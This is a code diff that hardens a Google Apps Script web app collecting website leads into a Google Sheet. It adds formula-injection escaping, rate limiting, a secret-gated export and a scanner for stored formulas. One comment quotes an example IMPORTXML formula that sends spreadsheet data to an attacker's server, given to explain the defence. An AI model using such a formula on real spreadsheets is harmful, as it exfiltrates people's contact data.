@@ -33,13 +33,70 @@ var COLUNAS_CLIQUES = ['data_hora', 'data_cliente', 'botao', 'pagina', 'disposit
 
 var PREFIXO_ID = 'CRX-';
 
+/* =========================================================
+   Proteção da escrita
+
+   Este Web App é público: a URL está no JavaScript do site, e qualquer pessoa
+   pode fazer POST para ela. Três camadas, em ordem de importância:
+
+   1. texto_()   — o Sheets trata valor que começa com "=" como FÓRMULA. Sem
+                   isto, alguém envia =IMPORTXML("http://servidor-dele/?d="&A2)
+                   no campo nome e, quando você abre a planilha, o Google
+                   executa e entrega a base de contatos para ele. É a camada
+                   que realmente importa: vale mesmo contra quem tem a chave.
+   2. limitado_() — teto de gravações por remetente e no total, para que um
+                   laço de script não encha a planilha nem estoure a cota.
+   3. SEGREDO_ENVIO — filtro simples. NÃO é autenticação: a chave viaja no
+                   JavaScript do site e é visível no navegador. Só serve para
+                   afastar quem chega pela URL solta, sem ler o site.
+   ========================================================= */
+
+/* Repetir o mesmo valor em cronex-site/js/main.js (CONTATO.chave).
+   Vazio = camada 3 desligada; as camadas 1 e 2 seguem valendo. */
+var SEGREDO_ENVIO = '';
+
+var LIMITE_POR_REMETENTE = 5;    // envios do mesmo telefone/e-mail
+var LIMITE_TOTAL = 100;          // envios de todo mundo somados
+var JANELA_S = 600;              // ambos por janela de 10 minutos
+
+/**
+ * Neutraliza injeção de fórmula. O apóstrofo à esquerda faz o Sheets guardar
+ * o valor como texto — ele não aparece na célula nem na exportação.
+ */
+function texto_(v) {
+  var s = String(v == null ? '' : v).slice(0, 500);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
+/** Já passou do teto nesta janela? Conta e responde. */
+function limitado_(chave) {
+  try {
+    var cache = CacheService.getScriptCache();
+    var total = Number(cache.get('_total') || 0);
+    if (total >= LIMITE_TOTAL) return true;
+    cache.put('_total', String(total + 1), JANELA_S);
+
+    var k = 'r_' + String(chave).replace(/\W/g, '').slice(0, 40);
+    var n = Number(cache.get(k) || 0);
+    if (n >= LIMITE_POR_REMETENTE) return true;
+    cache.put(k, String(n + 1), JANELA_S);
+    return false;
+  } catch (err) {
+    return false;   // cache indisponível não pode derrubar a captação
+  }
+}
+
 function doPost(e) {
   var lock = LockService.getScriptLock();
   lock.tryLock(15000); // evita corrida entre dois envios simultâneos
   try {
     var p = (e && e.parameter) ? e.parameter : {};
-    var quando = new Date();
 
+    // recusa em silêncio: responder "bloqueado" só ensina o atacante a ajustar
+    if (SEGREDO_ENVIO && p.chave !== SEGREDO_ENVIO) return json_({ ok: true });
+    if (limitado_(p.telefone || p.email || p.pagina || 'anon')) return json_({ ok: true });
+
+    var quando = new Date();
     if (p.tipo === 'clique_wpp') {
       registrarClique_(p, quando);
     } else {
@@ -48,30 +105,77 @@ function doPost(e) {
     }
     return json_({ ok: true });
   } catch (err) {
-    return json_({ ok: false, erro: String(err) });
+    // a mensagem interna do Apps Script não vai para quem chamou
+    console.error('doPost falhou: ' + err);
+    return json_({ ok: false });
   } finally {
     lock.releaseLock();
   }
 }
 
-// Só para testar no navegador se o Web App está no ar.
-function doGet() {
-  return json_({ ok: true, servico: 'CRONEX leads', hora: new Date().toISOString() });
+/**
+ * GET sem parâmetros: só confirma que o Web App está no ar.
+ * GET ?acao=exportar&segredo=XXX: devolve a aba Leads em JSON, para o sistema
+ * de gestão importar (ver README, seção "Exportar para o sistema").
+ *
+ * O segredo é obrigatório na exportação — sem ele, qualquer pessoa com a URL
+ * leria a base de leads inteira. Defina em SEGREDO_EXPORTACAO abaixo e repita
+ * o mesmo valor no sistema, em Configurações → Planilhas.
+ */
+var SEGREDO_EXPORTACAO = '';   // <-- defina um valor longo e aleatório
+
+function doGet(e) {
+  var p = (e && e.parameter) ? e.parameter : {};
+
+  if (p.acao !== 'exportar') {
+    return json_({ ok: true, servico: 'CRONEX leads', hora: new Date().toISOString() });
+  }
+  if (!SEGREDO_EXPORTACAO) {
+    return json_({ erro: 'exportacao desativada: defina SEGREDO_EXPORTACAO no script' });
+  }
+  if (p.segredo !== SEGREDO_EXPORTACAO) {
+    Utilities.sleep(1000);                 // encarece tentativa de adivinhar
+    return json_({ erro: 'segredo invalido' });
+  }
+  return json_(exportarLeads_());
+}
+
+/** Lê a aba Leads e devolve uma lista de objetos {coluna: valor}. */
+function exportarLeads_() {
+  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(ABA_LEADS);
+  if (!aba || aba.getLastRow() < 2) return [];
+
+  var faixa = aba.getRange(1, 1, aba.getLastRow(), aba.getLastColumn()).getDisplayValues();
+  var cabecalho = faixa[0].map(function (c) { return String(c).trim(); });
+  var saida = [];
+
+  for (var i = 1; i < faixa.length; i++) {
+    var linha = {}, vazia = true;
+    for (var j = 0; j < cabecalho.length; j++) {
+      if (!cabecalho[j]) continue;
+      var v = faixa[i][j];
+      linha[cabecalho[j]] = v;
+      if (String(v).trim() !== '') vazia = false;
+    }
+    if (!vazia) saida.push(linha);
+  }
+  return saida;
 }
 
 /* ---------- aba Leads: histórico, uma linha por envio ---------- */
 function registrarLead_(p, quando) {
   var aba = obterAba_(ABA_LEADS, COLUNAS_LEADS);
+  // texto_() em TODO campo vindo de fora: um só esquecido reabre a porta
   aba.appendRow([
-    quando, p.data || '', p.nome || '', p.empresa || '', p.telefone || '',
-    p.email || '', p.segmento || '', p.pacote || '', p.mensagem || '', p.origem || ''
+    quando, texto_(p.data), texto_(p.nome), texto_(p.empresa), texto_(p.telefone),
+    texto_(p.email), texto_(p.segmento), texto_(p.pacote), texto_(p.mensagem), texto_(p.origem)
   ]);
 }
 
 /* ---------- aba Cliques WhatsApp: um registro por clique ---------- */
 function registrarClique_(p, quando) {
   var aba = obterAba_(ABA_CLIQUES, COLUNAS_CLIQUES);
-  aba.appendRow([quando, p.data || '', p.botao || '', p.pagina || '', p.dispositivo || '']);
+  aba.appendRow([quando, texto_(p.data), texto_(p.botao), texto_(p.pagina), texto_(p.dispositivo)]);
 }
 
 /* ---------- aba Contatos: uma linha por pessoa ---------- */
@@ -94,18 +198,18 @@ function atualizarContato_(p, quando) {
   if (linhaAlvo === -1) {
     var id = PREFIXO_ID + ('0000' + (maiorNumero + 1)).slice(-4);
     aba.appendRow([
-      id, p.nome || '', p.empresa || '', p.telefone || '', p.email || '',
-      p.segmento || '', p.pacote || '', quando, quando, 1, p.origem || ''
+      id, texto_(p.nome), texto_(p.empresa), texto_(p.telefone), texto_(p.email),
+      texto_(p.segmento), texto_(p.pacote), quando, quando, 1, texto_(p.origem)
     ]);
   } else {
     var atual = aba.getRange(linhaAlvo, 1, 1, COLUNAS_CONTATOS.length).getValues()[0];
     var novo = atual.slice();
-    if (p.nome)     novo[1] = p.nome;
-    if (p.empresa)  novo[2] = p.empresa;
-    if (p.telefone) novo[3] = p.telefone;
-    if (p.email)    novo[4] = p.email;
-    if (p.segmento) novo[5] = p.segmento;
-    if (p.pacote)   novo[6] = p.pacote;
+    if (p.nome)     novo[1] = texto_(p.nome);
+    if (p.empresa)  novo[2] = texto_(p.empresa);
+    if (p.telefone) novo[3] = texto_(p.telefone);
+    if (p.email)    novo[4] = texto_(p.email);
+    if (p.segmento) novo[5] = texto_(p.segmento);
+    if (p.pacote)   novo[6] = texto_(p.pacote);
     // novo[7] (primeiro_contato) permanece
     novo[8] = quando;                        // ultimo_contato
     novo[9] = (Number(atual[9]) || 0) + 1;   // qtd_contatos
@@ -135,6 +239,41 @@ function reconstruirContatos() {
       l[0] || new Date()
     );
   }
+}
+
+/**
+ * Varre as três abas procurando célula que o Sheets esteja tratando como
+ * fórmula. Depois de ligar o texto_(), rode UMA VEZ pelo editor para conferir
+ * o que já estava gravado antes: selecionar "procurarFormulas" → Executar, e
+ * ler o resultado em Execuções.
+ *
+ * Toda fórmula encontrada em coluna de dado do cliente é suspeita — nenhuma
+ * das colunas deveria conter uma. Se aparecer alguma, trate como incidente:
+ * apague a célula, veja para onde ela apontava e assuma que o conteúdo da
+ * planilha pode ter vazado.
+ */
+function procurarFormulas() {
+  var ss = SpreadsheetApp.getActiveSpreadsheet();
+  var achados = [];
+
+  [ABA_LEADS, ABA_CONTATOS, ABA_CLIQUES].forEach(function (nome) {
+    var aba = ss.getSheetByName(nome);
+    if (!aba || aba.getLastRow() < 2) return;
+    var f = aba.getRange(1, 1, aba.getLastRow(), aba.getLastColumn()).getFormulas();
+    for (var i = 0; i < f.length; i++) {
+      for (var j = 0; j < f[i].length; j++) {
+        if (f[i][j]) {
+          achados.push(nome + ' linha ' + (i + 1) + ' coluna ' + (j + 1) + ': ' + f[i][j]);
+        }
+      }
+    }
+  });
+
+  var msg = achados.length
+    ? 'ATENÇÃO — ' + achados.length + ' fórmula(s) encontrada(s):\n' + achados.join('\n')
+    : 'Nenhuma fórmula nas abas de dados. Planilha limpa.';
+  console.log(msg);
+  return msg;
 }
 
 /* ---------- utilitários ---------- */
